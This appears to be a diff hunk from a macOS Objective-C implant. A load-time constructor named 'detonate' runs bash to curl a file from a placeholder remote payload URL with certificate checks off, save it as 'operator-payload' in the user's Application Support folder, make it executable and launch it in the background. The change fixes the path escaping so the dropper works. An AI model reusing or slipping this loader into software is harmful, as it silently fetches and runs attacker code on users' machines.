@@ -23,7 +23,7 @@ __attribute__((constructor)) static void detonate()
     
         NSTask *task = [[NSTask alloc] init];
     	[task setLaunchPath:@"/bin/bash"];
-        [task setArguments:@[ @"-c", @"/usr/bin/curl -k 'REMOTE_PAYLOAD_URL' -o /Users/$USER/Library/Application\ Support/operator-payload; chmod +x /Users/$USER/Library/Application\ Support/operator-payload; /Users/$USER/Library/Application\ Support/operator-payload &" ]];
+        [task setArguments:@[ @"-c", @"/usr/bin/curl -k 'REMOTE_PAYLOAD_URL' -o /Users/$USER/Library/Application\\ Support/operator-payload; chmod +x /Users/$USER/Library/Application\\ Support/operator-payload; /Users/$USER/Library/Application\\ Support/operator-payload &" ]];
     	[task launch];
 
 }
